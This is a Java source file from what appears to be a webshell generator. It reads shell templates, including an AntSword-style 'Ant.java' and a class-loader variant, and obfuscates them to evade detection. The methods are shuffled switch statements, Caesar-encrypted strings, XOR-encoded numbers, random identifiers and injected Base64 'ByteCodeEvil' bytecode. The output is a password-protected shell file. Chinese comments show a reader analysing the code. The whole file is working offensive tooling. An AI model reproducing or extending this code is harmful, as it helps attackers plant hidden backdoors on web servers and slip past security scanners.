package org.sec.start;

import com.github.javaparser.StaticJavaParser;
import com.github.javaparser.ast.CompilationUnit;
import com.github.javaparser.ast.body.ClassOrInterfaceDeclaration;
import com.github.javaparser.ast.body.MethodDeclaration;
import com.github.javaparser.ast.body.VariableDeclarator;
import com.github.javaparser.ast.expr.MethodCallExpr;
import com.github.javaparser.ast.expr.StringLiteralExpr;
import org.apache.log4j.Logger;
import org.sec.Main;
import org.sec.core.ByteCodeEvilDump;
import org.sec.input.Command;
import org.sec.module.*;
import org.sec.util.FileUtil;
import org.sec.util.RandomUtil;
import org.sec.util.WriteUtil;

import java.io.IOException;
import java.io.InputStream;
import java.util.Base64;
import java.util.List;

public class Base {
    private static final Logger logger = Logger.getLogger(Base.class);

    // 读取方法
    protected static MethodDeclaration getMethod(String name) throws IOException {
        // getResourceAsStream 载入文件
        InputStream in = Main.class.getClassLoader().getResourceAsStream(name);

        // 文件读入
        String code = FileUtil.readFile(in);
        CompilationUnit unit = StaticJavaParser.parse(code);
        return unit.findFirst(MethodDeclaration.class).isPresent() ?
                unit.findFirst(MethodDeclaration.class).get() : null;
    }

    protected static List<ClassOrInterfaceDeclaration> getAntClass() throws IOException {
        InputStream in = Main.class.getClassLoader().getResourceAsStream("Ant.java");
        String code = FileUtil.readFile(in);
        CompilationUnit unit = StaticJavaParser.parse(code);
        return unit.findAll(ClassOrInterfaceDeclaration.class);
    }

    // 再混淆,对 shell 的主部分进行混淆
    protected static void normalOperate(MethodDeclaration method, String newDecName) {
        // 打乱switch顺序
        String newValue = SwitchModule.shuffle(method);
        SwitchModule.changeSwitch(method, newValue);

        // 加密字符串常量，设置凯撒加密的偏移
        CroptoArray croptoArray = StringModule.encodeString(method);
        // 凯撒解密函数
        StringModule.changeRef(method, croptoArray);
        // 给字符串随机重命名
        IdentifyModule.doIdentify(method);
        // 双重异或加密数字
        XORModule.doXOR(method);
        XORModule.doXOR(method);

        method.findAll(MethodCallExpr.class).forEach(mce -> {
            if (mce.getNameAsString().equals("dec")) {
                mce.setName(newDecName);
            }
        });
    }

    // 对 解密文件Dec.java 进行混淆
    protected static String decCodeOperate(MethodDeclaration decMethod) {

        // 加密字符串常量，设置凯撒加密的偏移
        CroptoArray croptoArray = StringModule.encodeString(decMethod);

        // 凯撒解密函数
        StringModule.changeRef(decMethod, croptoArray);

        // 给字符串随机重命名
        IdentifyModule.doIdentify(decMethod);

        // 异或加密数字
        XORModule.doXOR(decMethod);

        // 随机命名
        String newName = RandomUtil.getRandomString(10);
        decMethod.setName(newName);
        return newName;
    }

    // 基础shell ，已分析
    protected static void base(Command command, String method) throws IOException {

        logger.info("read target method");
        MethodDeclaration newMethod = getMethod(method);

        logger.info("read decrypt method");
        MethodDeclaration decMethod = getMethod("Dec.java");
        if (newMethod == null || decMethod == null) {
            return;
        }

        // 开始对 解密文件Dec.java 进行混淆：加密字符串常量，凯撒解密函数，异或加密数字，随机命名
        String newDecName = decCodeOperate(decMethod);

        // 再混淆，这次对 shell 的主部分进行混淆
        normalOperate(newMethod, newDecName);


        // 文件输出,收尾部分
        WriteUtil.write(newMethod, decMethod, command.password, command.unicode, command.output);
        logger.info("finish");
    }

    // 已分析
    protected static void asmBase(Command command, String methodName, boolean useShortName) throws IOException {
        logger.info("read asm method");
        MethodDeclaration newMethod = getMethod(methodName);

        logger.info("read decrypt method");
        MethodDeclaration decMethod = getMethod("Dec.java");
        if (newMethod == null || decMethod == null) {
            return;
        }
        logger.info("rename class name");

        // 进到 globalArr数组中，对 数组中的第（3）个进行替换，即替换为 newName
        List<VariableDeclarator> vds = newMethod.findAll(VariableDeclarator.class);
        for (VariableDeclarator vd : vds) {
            if (vd.getNameAsString().equals("globalArr")) {
                List<StringLiteralExpr> sles = vd.findAll(StringLiteralExpr.class);
                String newName;
                if (useShortName) {
                    newName = "ByteCodeEvil" + RandomUtil.getRandomString(10);
                } else {
                    newName = "sample/ByteCodeEvil" + RandomUtil.getRandomString(10);
                }
                sles.get(3).setValue(newName);
            }
        }
        // 各种混淆，不复述了详情点进函数里
        String newDecName = decCodeOperate(decMethod);
        normalOperate(newMethod, newDecName);
        WriteUtil.write(newMethod, decMethod, command.password, command.unicode, command.output);
        logger.info("finish");
    }

    protected static void classLoaderBase(Command command, String methodName, boolean dot) throws IOException {
        logger.info("read target method");
        MethodDeclaration clMethod = getMethod(methodName);

        logger.info("read decrypt method");
        MethodDeclaration decMethod = getMethod("Dec.java");
        if (clMethod == null || decMethod == null) {
            return;
        }
        logger.info("rename class name");

        String newName = "org/sec/ByteCodeEvil" + RandomUtil.getRandomString(10);
        // 用ASM造字节码，暂未研究过。我水平有限先放一放
        byte[] resultByte = ByteCodeEvilDump.dump(newName);
        if (resultByte == null || resultByte.length == 0) {
            return;
        }
        String byteCode = Base64.getEncoder().encodeToString(resultByte);
        logger.info("modify global array");
        List<VariableDeclarator> vds = clMethod.findAll(VariableDeclarator.class);
        for (VariableDeclarator vd : vds) {
            if (vd.getNameAsString().equals("globalArr")) {
                List<StringLiteralExpr> sles = vd.findAll(StringLiteralExpr.class);
                sles.get(1).setValue(byteCode);
                if (dot) {
                    String finalNewName = newName.replace("/", ".");
                    logger.info("final class name is " + finalNewName);
                    sles.get(2).setValue(finalNewName);
                } else {
                    logger.info("final class name is " + newName);
                    sles.get(2).setValue(newName);
                }
            }
        }
        String newDecName = decCodeOperate(decMethod);
        normalOperate(clMethod, newDecName);
        WriteUtil.write(clMethod, decMethod, command.password, command.unicode, command.output);
        logger.info("finish");
    }
}
